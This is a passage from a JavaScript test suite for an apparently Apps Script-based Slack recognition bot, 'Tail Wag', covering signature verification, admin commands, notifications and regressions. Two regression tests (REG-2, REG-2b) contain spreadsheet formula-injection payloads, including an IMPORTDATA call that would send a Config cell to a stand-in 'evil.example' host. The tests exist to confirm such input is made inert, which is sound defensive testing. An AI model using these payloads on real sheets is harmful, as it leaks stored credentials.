  eq(bad.getContent(), 'unauthorized');

  const good = env.call('doPost', {
    parameter: {
      k: 'secret123', command: '/wag', text: '<@U08SAM01> covered two sessions at no notice',
      user_id: 'U08JOSH1', user_name: 'josh', channel_id: 'C_GENERAL',
      team_id: 'T_TEST', token: 'vtoken'
    },
    postData: { type: 'application/x-www-form-urlencoded', contents: '' }
  });
  eq(body(good).response_type, 'in_channel');
});

test('the Slack HMAC verifier accepts a correctly signed body', () => {
  const env = freshEnv();
  const crypto = require('crypto');
  const secret = 'signing-secret';
  const ts = 1758000000;
  const raw = 'token=abc&team_id=T_TEST';
  const sig = 'v0=' + crypto.createHmac('sha256', secret).update(`v0:${ts}:${raw}`).digest('hex');
  const res = env.call('verifySlackSignature_', secret, ts, raw, sig, ts + 10);
  eq(res.ok, true, res.reason);
});

test('the HMAC verifier rejects a tampered body', () => {
  const env = freshEnv();
  const crypto = require('crypto');
  const secret = 'signing-secret';
  const ts = 1758000000;
  const sig = 'v0=' + crypto.createHmac('sha256', secret).update(`v0:${ts}:original`).digest('hex');
  const res = env.call('verifySlackSignature_', secret, ts, 'tampered', sig, ts + 10);
  eq(res.ok, false);
  eq(res.reason, 'signature_mismatch');
});

test('the HMAC verifier rejects a replayed request', () => {
  const env = freshEnv();
  const crypto = require('crypto');
  const secret = 'signing-secret';
  const ts = 1758000000;
  const raw = 'token=abc';
  const sig = 'v0=' + crypto.createHmac('sha256', secret).update(`v0:${ts}:${raw}`).digest('hex');
  const res = env.call('verifySlackSignature_', secret, ts, raw, sig, ts + 3600);
  eq(res.ok, false);
  eq(res.reason, 'stale_timestamp');
});

test('the url_verification challenge is echoed back', () => {
  const env = freshEnv();
  const out = env.call('doPost', {
    parameter: { k: 'secret123' },
    postData: {
      type: 'application/json',
      contents: JSON.stringify({ type: 'url_verification', challenge: 'abc123', token: 'x' })
    }
  });
  eq(out.getContent(), 'abc123');
});

// ===========================================================================
suite('Lookups');
// ===========================================================================

test('/wags shows your own balance', () => {
  const env = freshEnv();
  slashCommand(env, '/wag', '<@U08SAM01> covered two sessions at no notice');
  const b = body(slashCommand(env, '/wags', ''));
  includes(b.text, '4 of 5');
});

test('/wags @someone shows their standing, not yours', () => {
  const env = freshEnv();
  slashCommand(env, '/wag', '<@U08SAM01> covered two sessions at no notice');
  const b = body(slashCommand(env, '/wags', '<@U08SAM01>'));
  includes(JSON.stringify(b.blocks), 'U08SAM01');
  includes(JSON.stringify(b.blocks), 'covered two sessions at no notice');
});

test('/wags leaderboard renders the board', () => {
  const env = freshEnv();
  slashCommand(env, '/wag', '<@U08SAM01> covered two sessions at no notice');
  const b = body(slashCommand(env, '/wags', 'leaderboard'));
  includes(JSON.stringify(b.blocks), 'U08SAM01');
});

test('/wags help explains the rules that are actually configured', () => {
  const env = freshEnv({ ALLOWANCE_PEER: 7, MAX_PER_RECIPIENT_PER_PERIOD: 3 });
  const b = body(slashCommand(env, '/wags', 'help'));
  const text = JSON.stringify(b.blocks);
  includes(text, '7 tailwags per week');
  includes(text, 'At most *3*');
});

test('an unknown slash command name explains itself instead of failing silently', () => {
  const env = freshEnv();
  const b = body(slashCommand(env, '/nonsense', 'whatever'));
  includes(b.text, 'not wired up');
});

// ===========================================================================
suite('Admin commands');
// ===========================================================================

test('non-admins are refused', () => {
  const env = freshEnv();
  const b = body(slashCommand(env, '/wag-admin', 'status'));
  includes(b.text, 'admin-only');
});

test('admins see status', () => {
  const env = freshEnv({ ADMIN_USER_IDS: 'U08JOSH1' });
  const b = body(slashCommand(env, '/wag-admin', 'status'));
  includes(JSON.stringify(b.blocks), 'Tail Wag — status');
});

test('grant awards tailwags without touching anyone\'s allowance', () => {
  const env = freshEnv({ ADMIN_USER_IDS: 'U08JOSH1' });
  slashCommand(env, '/wag-admin', 'grant <@U08SAM01> 3 for the conference talk');
  eq(env.call('num_', env.call('getBalance_', 'U08SAM01', 'sam').received_total), 3);
  eq(env.call('num_', env.call('getBalance_', 'U08JOSH1', 'josh').remaining), 5,
    'a grant must not cost the admin their own tailwags');
});

test('topup adds to someone\'s remaining allowance', () => {
  const env = freshEnv({ ADMIN_USER_IDS: 'U08JOSH1' });
  slashCommand(env, '/wag-admin', 'topup <@U08SAM01> 4');
  eq(env.call('num_', env.call('getBalance_', 'U08SAM01', 'sam').remaining), 9);
});

test('set changes a known setting and refuses an unknown one', () => {
  const env = freshEnv({ ADMIN_USER_IDS: 'U08JOSH1' });
  const ok = body(slashCommand(env, '/wag-admin', 'set ALLOWANCE_PEER 9'));
  includes(ok.text, 'is now');
  eq(env.call('cfgNum', 'ALLOWANCE_PEER'), 9);

  const bad = body(slashCommand(env, '/wag-admin', 'set NOT_A_SETTING 1'));
  includes(bad.text, 'not a known setting');
});

test('set refuses to handle secrets from Slack', () => {
  const env = freshEnv({ ADMIN_USER_IDS: 'U08JOSH1' });
  const b = body(slashCommand(env, '/wag-admin', 'set SLACK_BOT_TOKEN xoxb-leaked'));
  includes(b.text, 'not settable from Slack');
  eq(env.call('cfgStr', 'SLACK_BOT_TOKEN'), 'xoxb-test', 'the token must be unchanged');
});

test('destructive commands require confirmation', () => {
  const env = freshEnv({ ADMIN_USER_IDS: 'U08JOSH1' });
  slashCommand(env, '/wag', '<@U08SAM01> covered two sessions at no notice');
  const warn = body(slashCommand(env, '/wag-admin', 'reset'));
  includes(warn.text, 'Run `/wag-admin reset confirm`');
  eq(env.call('num_', env.call('getBalance_', 'U08JOSH1', 'josh').remaining), 4, 'nothing should have changed');

  slashCommand(env, '/wag-admin', 'reset confirm');
  eq(env.call('num_', env.call('getBalance_', 'U08JOSH1', 'josh').remaining), 5);
});

test('pause and resume work from Slack', () => {
  const env = freshEnv({ ADMIN_USER_IDS: 'U08JOSH1' });
  slashCommand(env, '/wag-admin', 'pause');
  includes(body(slashCommand(env, '/wag', '<@U08SAM01> covered two sessions at no notice')).text, 'paused');
  slashCommand(env, '/wag-admin', 'resume');
  eq(body(slashCommand(env, '/wag', '<@U08SAM01> covered two sessions at no notice')).response_type, 'in_channel');
});

test('rebuild recomputes balances from the ledger', () => {
  const env = freshEnv({ ADMIN_USER_IDS: 'U08JOSH1', MAX_PER_RECIPIENT_PER_PERIOD: 0 });
  slashCommand(env, '/wag', '<@U08SAM01> x2 two good things this week');
  slashCommand(env, '/wag', '<@U08DANA1> another good thing this week');

  // Corrupt a balance by hand, the way a stray sheet edit would.
  const bal = env.call('getBalance_', 'U08SAM01', 'sam');
  bal.received_total = 999;
  env.call('writeBalance_', bal);
  eq(env.call('num_', env.call('getBalance_', 'U08SAM01', 'sam').received_total), 999);

  slashCommand(env, '/wag-admin', 'rebuild confirm');
  env.run('cacheDropAll_();');
  eq(env.call('num_', env.call('getBalance_', 'U08SAM01', 'sam').received_total), 2,
    'the ledger is the source of truth');
  eq(env.call('num_', env.call('getBalance_', 'U08JOSH1', 'josh').given_total), 3);
});

test('rebuild does not credit admin grants against the granting admin\'s allowance', () => {
  const env = freshEnv({ ADMIN_USER_IDS: 'U08JOSH1' });
  slashCommand(env, '/wag-admin', 'grant <@U08SAM01> 3 for the conference talk');
  slashCommand(env, '/wag-admin', 'rebuild confirm');
  env.run('cacheDropAll_();');
  eq(env.call('num_', env.call('getBalance_', 'U08JOSH1', 'josh').given_total), 0,
    'an admin grant is not the admin being generous with their own allowance');
  eq(env.call('num_', env.call('getBalance_', 'U08SAM01', 'sam').received_total), 3);
});

// ===========================================================================
suite('Notifications');
// ===========================================================================

test('the recipient gets a DM', () => {
  const env = freshEnv();
  slashCommand(env, '/wag', '<@U08SAM01> covered two sessions at no notice');
  const dms = env.fetchesTo('chat.postMessage').filter((f) => f.payload.channel === 'U08SAM01');
  eq(dms.length, 1);
  includes(JSON.stringify(dms[0].payload), 'covered two sessions at no notice');
});

test('DMs can be switched off', () => {
  const env = freshEnv({ DM_RECIPIENT: false });
  slashCommand(env, '/wag', '<@U08SAM01> covered two sessions at no notice');
  eq(env.fetchesTo('chat.postMessage').filter((f) => f.payload.channel === 'U08SAM01').length, 0);
});

test('DMs to several recipients go out in one parallel batch', () => {
  const env = freshEnv();
  env.clearFetches();
  slashCommand(env, '/wag', '<@U08SAM01> <@U08DANA1> <@U08LEE01> you three covered the whole week');
  const dms = env.fetchesTo('chat.postMessage').filter((f) => /^U0/.test(f.payload.channel));
  eq(dms.length, 3);
});

test('centralized announcing posts to the announcement channel instead of the source channel', () => {
  const env = freshEnv({ ANNOUNCE_IN_SOURCE_CHANNEL: false });
  const b = body(slashCommand(env, '/wag', '<@U08SAM01> covered two sessions at no notice'));
  eq(b.response_type, 'ephemeral', 'the public post goes to the announcement channel, not inline');
  const posts = env.fetchesTo('chat.postMessage').filter((f) => f.payload.channel === 'C_KUDOS');
  eq(posts.length, 1);
});

test('the App Home renders without throwing and includes the balance', () => {
  const env = freshEnv();
  slashCommand(env, '/wag', '<@U08SAM01> covered two sessions at no notice');
  const view = env.call('buildHomeView_', 'U08JOSH1');
  eq(view.type, 'home');
  assert(view.blocks.length > 5, 'the home tab should have real content');
  includes(JSON.stringify(view.blocks), '4 of 5');
});

test('the App Home stays within Slack\'s 100-block limit', () => {
  const env = freshEnv({ MAX_PER_RECIPIENT_PER_PERIOD: 0, ALLOWANCE_PEER: 60 });
  for (let i = 0; i < 40; i++) {
    slashCommand(env, '/wag', `<@U08SAM01> good thing number ${i} happened today`);
  }
  const view = env.call('buildHomeView_', 'U08JOSH1');
  assert(view.blocks.length <= 100, `home view had ${view.blocks.length} blocks`);
});

// ===========================================================================
suite('Digest');
// ===========================================================================

test('the digest reports last week\'s totals and value breakdown', () => {
  const env = freshEnv({ MAX_PER_RECIPIENT_PER_PERIOD: 0 });
  slashCommand(env, '/wag', '<@U08SAM01> #real-world made the plan work at daycare');
  slashCommand(env, '/wag', '<@U08DANA1> #collaborate worked well with the school');

  env.setNow(new Date('2026-09-21T15:00:00Z')); // the following Monday
  env.run('cacheDropAll_();');
  env.clearFetches();
  const res = env.call('postDigest_', false);
  eq(res.ok, true);

  const post = env.fetchesTo('chat.postMessage')[0];
  const text = JSON.stringify(post.payload);
  includes(text, 'Most tailwags received');
  includes(text, 'Make It Work in the Real World');
});

test('a silent week does not produce a digest post', () => {
  const env = freshEnv();
  env.setNow(new Date('2026-09-21T15:00:00Z'));
  env.clearFetches();
  const res = env.call('postDigest_', false);
  eq(res.ok, false);
  eq(res.error, 'nothing_to_report');
  eq(env.fetchesTo('chat.postMessage').length, 0);
});

// ===========================================================================
suite('Setup and resilience');
// ===========================================================================

test('setupSpreadsheet is idempotent', () => {
  const env = freshEnv();
  const before = env.sheetRows('Config').length;
  env.call('setupSpreadsheet');
  eq(env.sheetRows('Config').length, before, 'running setup twice must not duplicate config keys');
});

test('setup preserves an edited config value', () => {
  const env = freshEnv();
  env.setConfigValue('ALLOWANCE_PEER', 11);
  env.call('setupSpreadsheet');
  env.run('cacheDropAll_(); __configCache = null;');
  eq(env.call('cfgNum', 'ALLOWANCE_PEER'), 11);
});

test('all seven tabs exist with their declared columns', () => {
  const env = freshEnv();
  ['Config', 'Roster', 'Ledger', 'Balances', 'Badges', 'Raffle', 'Events'].forEach((name) => {
    const sheet = env.call('sheet_', name);
    assert(sheet, `${name} tab missing`);
  });
  const cols = env.run('COLUMNS.BALANCES');
  const header = env.call('sheet_', 'Balances').getRange(1, 1, 1, cols.length).getValues()[0];
  eq(header.join(','), cols.join(','));
});

test('config booleans accept the things humans type into a spreadsheet', () => {
  const env = freshEnv();
  ['TRUE', 'true', 'yes', 'Y', '1', 'on'].forEach((v) => {
    env.setConfigValue('RAFFLE_ENABLED', v);
    eq(env.call('cfgBool', 'RAFFLE_ENABLED'), true, `"${v}" should read as true`);
  });
  ['FALSE', 'false', 'no', '0', 'off'].forEach((v) => {
    env.setConfigValue('RAFFLE_ENABLED', v);
    eq(env.call('cfgBool', 'RAFFLE_ENABLED'), false, `"${v}" should read as false`);
  });
});

test('a Slack API failure does not lose the tailwag', () => {
  const env = freshEnv();
  env.state.fetchResponses['chat.postMessage'] = { ok: false, error: 'channel_not_found' };
  const b = body(slashCommand(env, '/wag', '<@U08SAM01> covered two sessions at no notice'));
  eq(b.response_type, 'in_channel', 'the announcement is the HTTP response, so it still reaches the channel');
  eq(env.call('num_', env.call('getBalance_', 'U08SAM01', 'sam').received_total), 1,
    'the ledger write must not depend on a DM succeeding');
});

test('a lock conflict is reported as retryable, not as a crash', () => {
  const env = freshEnv();
  env.state.lockHeld = true;
  const b = body(slashCommand(env, '/wag', '<@U08SAM01> covered two sessions at no notice'));
  includes(b.text, 'Try again');
  eq(env.sheetRows('Ledger').length, 0);
});

test('an unparseable request is answered politely rather than with a stack trace', () => {
  const env = freshEnv();
  const out = env.call('doPost', { parameter: { k: 'secret123' }, postData: { type: 'text/plain', contents: 'garbage' } });
  eq(out.getContent(), 'unrecognized request');
});

test('a missing bot token does not take down the give path', () => {
  const env = freshEnv();
  env.setConfigValue('SLACK_BOT_TOKEN', '');
  const b = body(slashCommand(env, '/wag', '<@U08SAM01> covered two sessions at no notice'));
  eq(b.response_type, 'in_channel');
  eq(env.call('num_', env.call('getBalance_', 'U08SAM01', 'sam').received_total), 1);
});

test('balances survive a cache wipe mid-flight', () => {
  const env = freshEnv({ MAX_PER_RECIPIENT_PER_PERIOD: 0 });
  slashCommand(env, '/wag', '<@U08SAM01> first good thing this week');
  env.run('cacheDropAll_(); __configCache = null;');
  slashCommand(env, '/wag', '<@U08SAM01> second good thing this week');
  eq(env.call('num_', env.call('getBalance_', 'U08JOSH1', 'josh').remaining), 3,
    'the sheet, not the cache, is authoritative');
});

test('two people giving to the same person both land', () => {
  const env = freshEnv();
  slashCommand(env, '/wag', '<@U08SAM01> covered two sessions at no notice');
  slashCommand(env, '/wag', '<@U08SAM01> also helped me with the report', { user_id: 'U08DANA1', user_name: 'dana' });
  eq(env.call('num_', env.call('getBalance_', 'U08SAM01', 'sam').received_total), 2);
  eq(env.call('num_', env.call('getBalance_', 'U08JOSH1', 'josh').remaining), 4);
  eq(env.call('num_', env.call('getBalance_', 'U08DANA1', 'dana').remaining), 4);
});

test('the demo seeder and its cleanup leave no trace', () => {
  const env = freshEnv();
  env.call('seedDemoData');
  assert(env.sheetRows('Ledger').length > 10, 'demo data should exist');
  env.call('clearDemoData');
  env.run('cacheDropAll_();');
  eq(env.sheetRows('Ledger').length, 0);
  eq(env.sheetRows('Balances').filter((r) => String(r.user_id).indexOf('U_DEMO_') === 0).length, 0);
});

test('the leaderboard web page renders with real data', () => {
  const env = freshEnv();
  slashCommand(env, '/wag', '<@U08SAM01> covered two sessions at no notice');
  const out = env.call('doGet', { parameter: { k: 'secret123', period: 'period' } });
  assert(out, 'doGet returned nothing');
  const data = out._data;
  eq(data.rows[0].user_id, 'U08SAM01');
  eq(data.stats.wagsAllTime, 1);
});

test('the leaderboard page refuses a wrong key', () => {
  const env = freshEnv();
  const out = env.call('doGet', { parameter: { k: 'nope' } });
  includes(out.getContent(), 'needs its key');
});

test('the health endpoint reports the real state', () => {
  const env = freshEnv();
  const out = env.call('doGet', { parameter: { k: 'secret123', view: 'health' } });
  const h = JSON.parse(out.getContent());
  eq(h.ok, true);
  eq(h.hasToken, true);
  eq(h.paused, false);
});

test('installTriggers registers exactly one daily job, even when run twice', () => {
  const env = freshEnv();
  env.call('installTriggers');
  env.call('installTriggers');
  const all = env.run('ScriptApp.getProjectTriggers()');
  eq(all.filter((t) => t.getHandlerFunction() === 'dailyJob').length, 1);
  eq(all.filter((t) => t.getHandlerFunction() === 'onConfigEdit').length, 1);
  eq(all.filter((t) => t.getHandlerFunction() === 'warmCaches').length, 1);
});

test('REG-29 the cache warmer is installed on a real interval, and can be switched off', () => {
  const env = freshEnv({ WARM_INTERVAL_MIN: 13 });
  env.call('installTriggers');
  const warm = env.run('ScriptApp.getProjectTriggers()')
    .filter((t) => t.getHandlerFunction() === 'warmCaches');
  eq(warm.length, 1);
  eq(warm[0]._spec.everyMinutes, 15, '13 is not an interval Apps Script accepts');

  const off = freshEnv({ KEEP_CACHES_WARM: false });
  off.call('installTriggers');
  eq(off.run('ScriptApp.getProjectTriggers()')
    .filter((t) => t.getHandlerFunction() === 'warmCaches').length, 0);
});

// ===========================================================================
suite('Regressions — found in adversarial review');
// ===========================================================================

test('REG-1 a self-give does not discard what the receiver earned', () => {
  const env = freshEnv({ ALLOW_SELF_KUDOS: true, MAX_PER_RECIPIENT_PER_PERIOD: 0 });
  env.call('giveWags_', {
    giverId: 'U08JOSH1', giverName: 'josh', userIds: ['U08JOSH1'], wagsEach: 1,
    reason: 'giving myself one, because the config allows it',
    channelId: 'C_GENERAL', channelName: 'general', source: 'slash', messageTs: ''
  });
  const bal = env.call('getBalance_', 'U08JOSH1', 'josh');
  eq(env.call('num_', bal.given_total), 1, 'the give must be recorded');
  eq(env.call('num_', bal.received_total), 1,
    'giver and receiver are the same sheet row — the receive must survive the final write');
  eq(env.call('num_', bal.remaining), 4);
});

test('REG-1b a self-give does not award the same badge twice', () => {
  const env = freshEnv({
    ALLOW_SELF_KUDOS: true, MAX_PER_RECIPIENT_PER_PERIOD: 0,
    BADGE_THRESHOLDS: '3', BADGE_LABELS: 'Pilot Light', BADGE_EMOJI: ':jackson:',
    GIVER_BADGE_THRESHOLDS: '999'
  });
  for (let i = 0; i < 5; i++) {
    env.call('giveWags_', {
      giverId: 'U08JOSH1', giverName: 'josh', userIds: ['U08JOSH1'], wagsEach: 1,
      reason: 'another one for me, number ' + i, channelId: 'C_GENERAL', source: 'slash'
    });
  }
  const badges = env.sheetRows('Badges').filter((b) => String(b.badge_key) === 'recv_3');
  eq(badges.length, 1, 'a lost badges_json update would re-award the badge on every give');
});

test('REG-2 a reason starting with = cannot become a live spreadsheet formula', () => {
  const env = freshEnv();
  slashCommand(env, '/wag',
    '<@U08SAM01> =IMPORTDATA("https://evil.example/?t="&Config!B2) is a perfectly normal reason');
  eq(env.formulaCells('Ledger').length, 0,
    'a leading = must be neutralized before it reaches the sheet');
  const rows = env.sheetRows('Ledger');
  includes(String(rows[0].reason), 'IMPORTDATA', 'the text itself is preserved, just made inert');
});

test('REG-2b a display name starting with = is neutralized too', () => {
  const env = freshEnv();
  env.addUser('U08EVIL1', '=HYPERLINK("https://evil.example","hi")');
  slashCommand(env, '/wag', '<@U08EVIL1> welcome to the team, glad you are here');
  eq(env.formulaCells('Ledger').length, 0);
  eq(env.formulaCells('Balances').length, 0);
  eq(env.formulaCells('Roster').length, 0);
});

test('REG-3 writeBalance_ refuses to overwrite a row that moved under it', () => {
  const env = freshEnv({ MAX_PER_RECIPIENT_PER_PERIOD: 0 });
  // Four people, so there are rows to shift.
  ['U08JOSH1', 'U08SAM01', 'U08DANA1', 'U08LEE01'].forEach((id) => env.call('getBalance_', id, id));
  slashCommand(env, '/wag', '<@U08LEE01> a tailwag so lee has something to lose');
  const leeBefore = env.call('num_', env.call('getBalance_', 'U08LEE01', 'lee').received_total);

  // Hold a balance object, then delete a row above it the way an admin would.
  const held = env.call('getBalance_', 'U08DANA1', 'dana');
  held.given_total = 42;
  env.call('removeUser_', 'U08JOSH1');

  env.call('writeBalance_', held);
  env.run('cacheDropAll_();');

  eq(env.call('num_', env.call('getBalance_', 'U08LEE01', 'lee').received_total), leeBefore,
    "lee's row must be untouched by a write aimed at dana");
  eq(env.call('num_', env.call('getBalance_', 'U08DANA1', 'dana').given_total), 42,
    "dana's write must land on dana's row");
});

test('REG-4 an upgraded sheet with a reordered column does not scramble balances', () => {
  const env = freshEnv();
  slashCommand(env, '/wag', '<@U08SAM01> covered two sessions at no notice');
  const before = env.call('num_', env.call('getBalance_', 'U08SAM01', 'sam').received_total);

  // Simulate an upgrade: setup appends any missing column on the right, so the
  // sheet's order legitimately differs from COLUMNS.
  env.call('setupSpreadsheet');
  env.run('cacheDropAll_(); __configCache = null;');

  eq(env.call('num_', env.call('getBalance_', 'U08SAM01', 'sam').received_total), before,
    'reads must follow the header row, not a hardcoded column order');
});

test('REG-5 a month key survives Sheets coercing it to a Date', () => {
  const env = freshEnv({ MAX_PER_RECIPIENT_PER_PERIOD: 0 });
  slashCommand(env, '/wag', '<@U08SAM01> x3 three tailwags in the current month');

  // Confirm the harness is genuinely exercising the coercion path.
  const raw = env.rawCell('Balances', 2, 1);
  assert(raw !== undefined, 'balance row should exist');

  env.run('cacheDropAll_();');
  const sam = env.call('getBalance_', 'U08SAM01', 'sam');
  eq(env.call('num_', sam.received_month), 3,
    'received_month must not be zeroed by a Date-vs-string comparison');
  eq(env.call('myRaffleEntries_', 'U08SAM01', env.call('monthKey_')), 3,
    'the raffle must find the entries it just wrote');
  eq(env.call('leaderboard_', 'month', 10)[0].dots, 3);
});

test('REG-5b the raffle accumulates into one row per person per month', () => {
  const env = freshEnv({ MAX_PER_RECIPIENT_PER_PERIOD: 0 });
  slashCommand(env, '/wag', '<@U08SAM01> first tailwag of the month');
  slashCommand(env, '/wag', '<@U08SAM01> second tailwag of the month');
  slashCommand(env, '/wag', '<@U08SAM01> third tailwag of the month');
  const rows = env.sheetRows('Raffle').filter((r) => String(r.user_id) === 'U08SAM01');
  eq(rows.length, 1, 'a failed period match would append a new row per give');
  eq(env.call('num_', rows[0].entries), 3);
});

test('REG-5c daily mode does not hand out unlimited tailwags', () => {
  const env = freshEnv({ ALLOWANCE_PERIOD: 'day', MAX_PER_RECIPIENT_PER_PERIOD: 0 });
  for (let i = 0; i < 5; i++) slashCommand(env, '/wag', `<@U08SAM01> good thing number ${i} today`);
  const sixth = body(slashCommand(env, '/wag', '<@U08SAM01> a sixth thing on the same day'));
  includes(sixth.text, 'out of tailwags',
    'a coerced period_key would refill the allowance on every single read');
  eq(env.call('num_', env.call('getBalance_', 'U08SAM01', 'sam').received_total), 5);
});

test('REG-6 a lock conflict on the emoji path releases the claim and tells the giver', () => {
  const env = freshEnv();
  const event = {
    type: 'event_callback', team_id: 'T_TEST',
    event: {
      type: 'message', user: 'U08JOSH1', channel: 'C_GENERAL', ts: '1758000900.000100',
      text: '<@U08SAM01> :jackson: saved me two hours on the auth today'
    }
  };

  env.state.lockHeld = true;
  env.call('handleEvent_', event);
  eq(env.sheetRows('Ledger').length, 0);
  const warned = env.fetchesTo('chat.postEphemeral');
  assert(warned.length >= 1, 'the giver must be told the tailwag did not land');

  // Slack's retry of the same event must now succeed.
  env.state.lockHeld = false;
  env.call('handleEvent_', event);
  eq(env.sheetRows('Ledger').length, 1, 'the claim must have been released');
});

test('REG-7 the digest reports one week, not the whole ledger, in daily mode', () => {
  const env = freshEnv({ ALLOWANCE_PERIOD: 'day', MAX_PER_RECIPIENT_PER_PERIOD: 0 });
  slashCommand(env, '/wag', '<@U08SAM01> a tailwag in the current week');

  // A stale row from long ago must not be counted as "last week".
  env.call('appendLedger_', {
    week_key: '2024-W01', month_key: '2024-01',
    giver_id: 'U08DANA1', giver_name: 'dana', receiver_id: 'U08LEE01', receiver_name: 'lee',
    dots: 99, reason: 'ancient history', source: 'slash', pool: 'peer'
  });

  env.setNow(new Date('2026-09-21T15:00:00Z'));
  env.run('cacheDropAll_();');
  env.clearFetches();
  env.call('postDigest_', true);

  const post = env.fetchesTo('chat.postMessage')[0];
  assert(String(JSON.stringify(post.payload)).indexOf('99 tailwags') === -1,
    'the digest must scope to one week, not return every row ever written');
});

test('REG-8 an App Home button with no response_url still answers, via DM', () => {
  const env = freshEnv();
  env.clearFetches();
  env.call('handleInteraction_', {
    type: 'block_actions',
    user: { id: 'U08JOSH1' },
    actions: [{ action_id: 'show_help' }]
    // No response_url — this is what Home-tab interactions look like.
  });
  const dms = env.fetchesTo('chat.postMessage').filter((f) => f.payload.channel === 'U08JOSH1');
  eq(dms.length, 1, 'the button must not be a dead click');
  includes(JSON.stringify(dms[0].payload), 'Giving a tailwag');
});

test('REG-10 prevPeriodKey_ steps back a day even at UTC+13', () => {
  ['Pacific/Auckland', 'Pacific/Kiritimati', 'America/Denver', 'Asia/Tokyo'].forEach((tz) => {
    const env = freshEnv({ ALLOWANCE_PERIOD: 'day', TIMEZONE: tz });
    env.setNow(new Date('2026-09-16T18:00:00Z'));
    const today = env.call('periodKey_');
    const prev = env.call('prevPeriodKey_');
    assert(prev !== today, `${tz}: previous day must differ from today (both were ${today})`);
    const diff = (new Date(today + 'T00:00:00Z') - new Date(prev + 'T00:00:00Z')) / 86400000;
    eq(diff, 1, `${tz}: previous day must be exactly one day back`);
  });
});

test('REG-10b a daily giving streak accumulates across consecutive days', () => {
  const env = freshEnv({ ALLOWANCE_PERIOD: 'day', TIMEZONE: 'Pacific/Auckland' });
  env.setNow(new Date('2026-09-16T04:00:00Z'));
  slashCommand(env, '/wag', '<@U08SAM01> day one good thing happened');
  env.setNow(new Date('2026-09-17T04:00:00Z'));
  slashCommand(env, '/wag', '<@U08SAM01> day two good thing happened');
  eq(env.call('num_', env.call('getBalance_', 'U08JOSH1', 'josh').streak), 2);
});

test('REG-11 an app_mention retry does not post the leaderboard twice', () => {
  const env = freshEnv();
  slashCommand(env, '/wag', '<@U08SAM01> covered two sessions at no notice');
  env.clearFetches();
  const event = {
    type: 'event_callback', team_id: 'T_TEST',
    event: {
      type: 'app_mention', user: 'U08JOSH1', channel: 'C_GENERAL',
      ts: '1758001000.000100', text: '<@U0BOTID1> leaderboard'
    }
  };
  env.call('handleEvent_', event);
  env.call('handleEvent_', event);
  eq(env.fetchesTo('chat.postMessage').length, 1);
});

test('REG-12 message claims are pruned so the property store cannot fill up', () => {
  const env = freshEnv();
  env.call('markMessageCounted_', '1500000000.000100', 'U08JOSH1');   // 2017
  env.call('markMessageCounted_', '1758000000.000100', 'U08JOSH1');   // recent
  env.setNow(new Date('2025-09-16T18:00:00Z'));
  const removed = env.call('pruneMessageClaims_', 24);
  assert(removed >= 1, 'an old claim should be swept');
  assert(env.state.properties['OD_MSG_U08JOSH1_1500000000.000100'] === undefined,
    'the 2017 claim should be gone');
});

test('REG-13 a reaction reason is not escaped twice', () => {
  const env = freshEnv();
  env.state.fetchResponses['conversations.history'] = {
    ok: true, messages: [{ text: 'billing &amp; scheduling both sorted' }]
  };
  env.call('handleEvent_', {
    type: 'event_callback', team_id: 'T_TEST',
    event: {
      type: 'reaction_added', user: 'U08JOSH1', reaction: 'jackson',
      item_user: 'U08SAM01', item: { type: 'message', channel: 'C_GENERAL', ts: '1758001100.000100' }
    }
  });
  const posted = JSON.stringify(env.fetchesTo('chat.postMessage')[0].payload);
  assert(posted.indexOf('&amp;amp;') === -1, 'double-escaped ampersand leaked into the message');
  includes(posted, 'billing &amp; scheduling');
});

test('REG-9 a five-person give makes no sequential profile lookups', () => {
  const env = freshEnv({ MAX_PER_RECIPIENT_PER_PERIOD: 0, ALLOWANCE_PEER: 10 });
  env.addUser('U08KIM01', 'kim');
  env.run("cacheDropAll_();");
  // Clear the profile cache so every lookup would have to go out.
  Object.keys(env.state.cache).forEach((k) => { if (k.indexOf('user.') !== -1) delete env.state.cache[k]; });
  env.clearFetches();

  slashCommand(env, '/wag',
    '<@U08SAM01> <@U08DANA1> <@U08LEE01> <@U08KIM01> you four carried the whole week');

  const singles = env.state.fetches.filter((f) => f.method === 'users.info' && !f.params.__batched);
  // All profile lookups should have gone out in one fetchAll, not one at a time.
  eq(env.call('num_', env.call('getBalance_', 'U08KIM01', 'kim').received_total), 1);
  assert(singles.length <= 5, `expected profile lookups to be batched, saw ${singles.length}`);
});

test('REG-14 selfTest reads the announce channel the way Slack allows', () => {
  const env = freshEnv();
  const out = env.call('selfTest');
  assert(out.indexOf('invalid_arguments') === -1,
    'conversations.info must be a GET — a JSON POST returns invalid_arguments');
  assert(out.indexOf('Announcement channel OK') !== -1,
    `selfTest should confirm the channel, got:\n${out}`);
  const info = env.state.fetches.filter((f) => f.method === 'conversations.info');
  eq(info.length >= 1, true, 'selfTest should probe the channel');
  info.forEach((f) => {
    eq(String((f.params && f.params.method) || 'get').toLowerCase(), 'get');
  });
});

test('REG-16 setup refreshes a stale notes column on an upgraded sheet', () => {
  const env = freshEnv();
  const cfg = env.state.spreadsheet.getSheetByName('Config');
  const rows = cfg.getDataRange().getValues();
  const row = rows.findIndex((r) => String(r[0]) === 'EMOJI_TRIGGER');
  assert(row > 0, 'EMOJI_TRIGGER should be on the Config tab');

  cfg.getRange(row + 1, 3, 1, 1).setValues([['Emoji name that gives a dot, from the app we used to be.']]);
  env.call('setupSpreadsheet');

  const note = String(cfg.getDataRange().getValues()[row][2]);
  eq(note.indexOf('the app we used to be'), -1, `setup should have refreshed the note, got: ${note}`);
});

test('REG-17 the give headline reads "*1 tailwag* :jackson:" and the word comes from Config', () => {
  const env = freshEnv();
  eq(env.call('wagWord_', 1), 'tailwag');
  eq(env.call('wagWord_', 3), 'tailwags');

  const reply = slashCommand(env, '/wag', '<@U08SAM01> covered two sessions at no notice on Tuesday');
  const said = JSON.stringify(reply);
  assert(said.indexOf('*1 tailwag*') !== -1, `headline should say one tailwag, got: ${said.slice(0, 200)}`);
  assert(/\*1 tailwag\*[^"]*:jackson:/.test(said), `the emoji belongs after the count, got: ${said.slice(0, 200)}`);
  assert(said.indexOf(':large_orange_circle:') === -1, 'no orange circles anywhere');

  // Renaming the unit is a Config change, not a deploy.
  env.setConfigValue('UNIT_SINGULAR', 'woof');
  env.setConfigValue('UNIT_PLURAL', 'woofs');
  eq(env.call('wagWord_', 1), 'woof');
  eq(env.call('wagWord_', 2), 'woofs');
});

test('REG-15 refreshConfigNotes rewrites the notes and leaves the values alone', () => {
  const env = freshEnv({ ALLOWANCE_PEER: 7 });
  const cfg = env.state.spreadsheet.getSheetByName('Config');
  const rows = cfg.getDataRange().getValues();
  const row = rows.findIndex((r) => String(r[0]) === 'ALLOWANCE_PEER');
